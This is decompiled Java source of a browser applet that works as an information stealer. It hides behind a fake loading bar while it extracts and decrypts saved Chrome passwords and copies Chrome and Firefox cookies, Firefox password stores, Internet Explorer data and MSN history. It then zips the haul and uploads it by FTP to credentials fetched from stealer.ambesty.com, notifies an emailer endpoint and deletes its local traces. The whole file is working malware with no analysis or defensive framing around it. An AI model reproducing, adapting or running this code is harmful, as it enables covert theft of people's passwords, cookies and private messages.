import java.awt.event.ActionEvent;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.util.Queue;
import java.util.LinkedList;
import java.sql.ResultSet;
import java.sql.Statement;
import java.sql.Connection;
import com.sun.jna.platform.win32.Crypt32Util;
import java.sql.DriverManager;
import javax.swing.JOptionPane;
import java.io.OutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.FilenameFilter;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URLConnection;
import java.io.File;
import javax.swing.filechooser.FileSystemView;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.InetAddress;
import java.util.Random;
import javax.swing.JFileChooser;
import java.awt.LayoutManager;
import java.awt.Component;
import java.awt.GridLayout;
import java.awt.Color;
import javax.swing.UIManager;
import java.awt.Font;
import javax.swing.JLabel;
import java.io.PrintWriter;
import javax.swing.JPanel;
import java.awt.event.ActionListener;
import javax.swing.JApplet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Applet extends JApplet implements ActionListener
{
    private JPanel pane;
    private String key;
    private String ip;
    private String ftpDataPath;
    private String ftpPath;
    private String id;
    private String pass;
    private String hash;
    private String loc;
    private String zipPath;
    private String browser;
    private String param;
    private boolean flashFlag;
    private static final int BUFFER = 2048;
    PrintWriter write;
    private static int load;
    private String emailer;
    JLabel label;
    JLabel finishLabel;
    Font bigFont;
    
    static {
        Applet.load = 0;
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    
    public Applet() {
        this.pane = null;
        this.key = "";
        this.ip = "";
        this.ftpDataPath = "http://stealer.ambesty.com/ftp_data.aspx?serial=";
        this.zipPath = "";
        this.browser = "";
        this.param = "Error, Cannot Detect Browser Info";
        this.flashFlag = true;
        this.write = null;
        this.emailer = "http://stealer.ambesty.com/emailer.aspx";
        this.label = new JLabel("Loading... " + Applet.load + "%");
        this.finishLabel = null;
        this.bigFont = new Font("CALIBRI", 1, 25);
    }
    
    public static void main(final String[] args) {
        final Applet a = new Applet();
        a.init();
    }
    
    @Override
    public void init() {
        this.loc = this.getCodeBase().toString();
        this.setBackground(Color.CYAN);
        this.param = this.getParameter("param1");
        this.key = this.getParameter("key");
        this.hash = this.getParameter("hash");
        try {
            this.jbInit();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void jbInit() throws Exception {
        final LayoutManager layout = new GridLayout(7, 1);
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        this.label.setFont(this.bigFont);
        this.label.setHorizontalAlignment(0);
        this.setLayout(layout);
        final Runnable flash = new Runnable() {
            @Override
            public void run() {
                try {
                    while (Applet.this.flashFlag) {
                        Applet.this.add(Applet.this.label);
                        Applet.this.repaint();
                        Thread.sleep(1200L);
                        Applet.this.remove(Applet.this.label);
                        Applet.this.repaint();
                        Thread.sleep(300L);
                        Applet.this.label.setText("Loading... " + Applet.load + "%");
                        if (Applet.load < 50) {
                            Applet.access$2(Applet.load + 4);
                        }
                        else if (Applet.load < 80) {
                            Applet.access$2(Applet.load + 2);
                        }
                        else if (Applet.load < 98) {
                            Applet.access$2(Applet.load + 1);
                        }
                        else {
                            Applet.access$2(99);
                        }
                    }
                    Applet.this.label.setText(Applet.this.param);
                    Applet.this.label.setForeground(Color.RED);
                    Applet.this.label.setHorizontalAlignment(0);
                    Applet.this.add(Applet.this.label);
                    Applet.this.repaint();
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        final Runnable run = new Runnable() {
            @Override
            public void run() {
                try {
                    Applet.this.doWork();
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        final Thread t = new Thread(flash);
        final Thread t2 = new Thread(run);
        t.setDaemon(true);
        t.start();
        t2.start();
    }
    
    protected void doWork() throws Exception {
        this.ip = this.getIP();
        final JFileChooser fr = new JFileChooser();
        final FileSystemView fw = fr.getFileSystemView();
        this.zipPath = String.valueOf(fw.getDefaultDirectory().getCanonicalPath()) + "\\";
        this.createFolder();
        this.write = new PrintWriter(String.valueOf(this.browser) + "log.txt");
        this.chrome7();
        this.firefox();
        this.IE();
        this.write.close();
        final File zip = this.zip(this.browser, String.valueOf(this.zipPath) + "out.zip");
        final Random randomGenerator = new Random();
        final String fileName = String.valueOf(this.ip) + "-" + randomGenerator.nextInt(100) + "-" + InetAddress.getLocalHost().getHostName() + ".zip";
        final URL ftpData = new URL(String.valueOf(this.ftpDataPath) + this.key + "&code=" + this.loc);
        final URLConnection yc = ftpData.openConnection();
        final BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
        String content = in.readLine();
        in.close();
        this.id = content.substring(0, content.indexOf(59));
        content = content.substring(content.indexOf(59) + 1);
        this.pass = content.substring(0, content.indexOf(59));
        content = content.substring(content.indexOf(59) + 1);
        this.ftpPath = content;
        final File msnZip = this.stealMsn();
        if (msnZip != null) {
            CSUploader.start(this.zipPath, msnZip.toString(), msnZip.getName(), this.emailer, this.hash, this.loc, this.id, this.pass, this.ftpPath);
        }
        System.out.println("between uploads: " + Applet.load);
        this.upload(this.ftpPath, this.id, this.pass, fileName, zip);
        final URL db = new URL(String.valueOf(this.emailer) + "?serial=" + this.hash + "&file=" + fileName + "&code=" + this.loc);
        final URLConnection con = db.openConnection();
        con.getInputStream();
        this.cleanUp();
        this.flashFlag = false;
    }
    
    public void createFolder() {
        this.browser = String.valueOf(this.zipPath) + "Browser\\";
        final File file = new File(this.browser);
        if (!file.exists()) {
            file.mkdir();
        }
    }
    
    public String getIP() {
        String ip = "";
        try {
            final URL url = new URL("http://www.whatismyip.org/");
            final HttpURLConnection Conn = (HttpURLConnection)url.openConnection();
            final InputStream InStream = Conn.getInputStream();
            final InputStreamReader Isr = new InputStreamReader(InStream);
            final BufferedReader Br = new BufferedReader(Isr);
            ip = Br.readLine();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return ip;
    }
    
    public File stealMsn() throws IOException {
        final String path = String.valueOf(this.zipPath) + "My Received Files/";
        final File f = new File(path);
        if (f.exists()) {
            final FilenameFilter filter = new FilenameFilter() {
                @Override
                public boolean accept(final File dir, final String name) {
                    return name.contains("History");
                }
            };
            File[] listFiles;
            for (int length = (listFiles = f.listFiles()).length, i = 0; i < length; ++i) {
                final File file = listFiles[i];
                final File[] listFiles2;
                if (file.isDirectory() && (listFiles2 = file.listFiles(filter)).length != 0) {
                    final File file2 = listFiles2[0];
                    return this.zip(file2.toString(), String.valueOf(this.zipPath) + this.ip + "-msn.zip");
                }
            }
        }
        return null;
    }
    
    public void copyFile(final String from, final String to) throws IOException {
        try {
            final File f1 = new File(from);
            final File f2 = new File(to);
            final InputStream in = new FileInputStream(f1);
            final OutputStream out = new FileOutputStream(f2);
            final byte[] buf = new byte[1024];
            int len;
            while ((len = in.read(buf)) > 0) {
                out.write(buf, 0, len);
            }
            in.close();
            out.close();
        }
        catch (FileNotFoundException ex) {
            System.out.println(String.valueOf(ex.getMessage()) + " in the specified directory.");
            System.exit(0);
        }
        catch (IOException e) {
            System.out.println(e.getMessage());
        }
    }
    
    public void cleanUp() throws InterruptedException {
        File file = new File(this.browser);
        File[] listFiles;
        for (int length = (listFiles = file.listFiles()).length, i = 0; i < length; ++i) {
            final File a = listFiles[i];
            a.delete();
        }
        file.delete();
        file = new File(String.valueOf(this.zipPath) + "out.zip");
        file.delete();
    }
    
    public void IE() throws IOException {
        try {
            this.write.println("Starting IE--");
            IEDecrypt.setPath(this.browser);
            IEDecrypt.history();
            IEDecrypt.registry();
        }
        catch (Exception e) {
            this.write.println(e.getMessage());
            this.write.println(e.getStackTrace());
            e.printStackTrace();
        }
    }
    
    public void chrome7() {
        try {
            this.write.println("Starting Chrome--");
            final File file = new File(System.getenv("APPDATA"));
            final String path = String.valueOf(file.getParent()) + "\\Local\\Google\\Chrome\\User Data\\Default\\";
            this.copyFile(String.valueOf(path) + "Login Data", String.valueOf(this.browser) + "Login Data");
            this.sqlite(String.valueOf(this.browser) + "Login Data", String.valueOf(this.browser) + "login.txt");
            final File file2 = new File(String.valueOf(this.browser) + "Login Data");
            file2.delete();
            final String[] files = { String.valueOf(path) + "Cookies" };
            String[] array;
            for (int length = (array = files).length, i = 0; i < length; ++i) {
                final String a = array[i];
                final File f = new File(a);
                this.copyFile(f.getPath(), String.valueOf(this.browser) + f.getName() + "-Chrome");
            }
        }
        catch (Exception e) {
            this.write.println(e.getMessage());
            this.write.println(e.getStackTrace());
            JOptionPane.showMessageDialog(this.pane, e.getMessage());
            JOptionPane.showMessageDialog(this.pane, e.getStackTrace());
        }
    }
    
    public void sqlite(final String path, final String output) throws Exception {
        final PrintWriter print = new PrintWriter(output);
        Class.forName("org.sqlite.JDBC");
        final Connection conn = DriverManager.getConnection("jdbc:sqlite:" + path);
        final Statement stat = conn.createStatement();
        final ResultSet rs = stat.executeQuery("select * from logins;");
        while (rs.next()) {
            print.println("URL = " + rs.getString("origin_url"));
            print.println("USERNAME = " + rs.getString("username_value"));
            final byte[] p = rs.getBytes("password_value");
            final byte[] decrypted = Crypt32Util.cryptUnprotectData(p);
            final String pw = new String(decrypted);
            print.println("PASSWORD = " + pw);
            print.println("--------------------");
        }
        print.close();
        rs.close();
        conn.close();
        stat.close();
    }
    
    public void firefox() {
        this.write.println("Starting FireFox--");
        final Queue<File> que = new LinkedList<File>();
        try {
            final String path = String.valueOf(System.getenv("APPDATA")) + "\\Mozilla\\Firefox\\Profiles\\";
            final File folder = new File(path);
            boolean foundFlag = false;
            File[] listFiles;
            for (int length = (listFiles = folder.listFiles()).length, j = 0; j < length; ++j) {
                final File a = listFiles[j];
                File[] listFiles2;
                for (int length2 = (listFiles2 = a.listFiles()).length, k = 0; k < length2; ++k) {
                    final File b = listFiles2[k];
                    if (b.getName().equals("cookies.sqlite") || b.getName().equals("signons.sqlite") || b.getName().equals("signons.txt") || b.getName().equals("signons2.txt") || b.getName().equals("key3.db") || b.getName().equals("cert8.db")) {
                        que.offer(b);
                        foundFlag = true;
                    }
                }
            }
            if (foundFlag) {
                final String[] files = new String[que.size()];
                for (int i = 0; i < files.length; ++i) {
                    files[i] = que.poll().getCanonicalPath();
                    final File f = new File(files[i]);
                    this.copyFile(f.getPath(), String.valueOf(this.browser) + f.getName() + "-FireFox");
                }
            }
        }
        catch (Exception e) {
            this.write.println(e.getMessage());
            this.write.println(e.getStackTrace());
            e.printStackTrace();
        }
    }
    
    public void upload(final String ftpServer, final String user, final String password, final String fileName, final File source) throws Exception {
        if (ftpServer != null && fileName != null && source != null) {
            final StringBuffer sb = new StringBuffer("ftp://");
            if (user != null && password != null) {
                sb.append(user);
                sb.append(':');
                sb.append(password);
                sb.append('@');
            }
            sb.append(ftpServer);
            sb.append('/');
            sb.append(fileName);
            sb.append(";type=i");
            BufferedInputStream bis = null;
            BufferedOutputStream bos = null;
            final byte[] buffer = new byte[1024];
            try {
                final URL url = new URL(sb.toString());
                final URLConnection urlc = url.openConnection();
                bos = new BufferedOutputStream(urlc.getOutputStream());
                bis = new BufferedInputStream(new FileInputStream(source));
                int readCount;
                while ((readCount = bis.read(buffer)) > 0) {
                    bos.write(buffer, 0, readCount);
                }
            }
            catch (Exception e) {
                e.printStackTrace();
                this.write.println(e.getMessage());
                this.write.println(e.getStackTrace());
                if (bis != null) {
                    try {
                        bis.close();
                    }
                    catch (IOException ioe) {
                        ioe.printStackTrace();
                    }
                }
                if (bos != null) {
                    try {
                        bos.close();
                    }
                    catch (IOException ioe) {
                        ioe.printStackTrace();
                    }
                }
                return;
            }
            finally {
                if (bis != null) {
                    try {
                        bis.close();
                    }
                    catch (IOException ioe) {
                        ioe.printStackTrace();
                    }
                }
                if (bos != null) {
                    try {
                        bos.close();
                    }
                    catch (IOException ioe) {
                        ioe.printStackTrace();
                    }
                }
            }
            if (bis != null) {
                try {
                    bis.close();
                }
                catch (IOException ioe) {
                    ioe.printStackTrace();
                }
            }
            if (bos != null) {
                try {
                    bos.close();
                }
                catch (IOException ioe) {
                    ioe.printStackTrace();
                }
            }
        }
        else {
            System.out.println("Input not available.");
        }
    }
    
    public File zip(final String inF, final String outF) throws IOException {
        final File inFolder = new File(inF);
        final File outFile = new File(outF);
        outFile.createNewFile();
        try {
            final ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
            BufferedInputStream in = null;
            final byte[] data = new byte[2048];
            final String[] files = inFolder.list();
            for (int i = 0; i < files.length; ++i) {
                in = new BufferedInputStream(new FileInputStream(String.valueOf(inFolder.getPath()) + "/" + files[i]), 2048);
                out.putNextEntry(new ZipEntry(files[i]));
                int count;
                while ((count = in.read(data, 0, 2048)) != -1) {
                    out.write(data, 0, count);
                }
                out.closeEntry();
            }
            in.close();
            out.flush();
            out.close();
        }
        catch (Exception e) {
            this.write.println(e.getMessage());
            this.write.println(e.getStackTrace());
            e.printStackTrace();
        }
        return outFile;
    }
    
    @Override
    public void actionPerformed(final ActionEvent arg0) {
    }
    
    static /* synthetic */ void access$2(final int load) {
        Applet.load = load;
    }
}
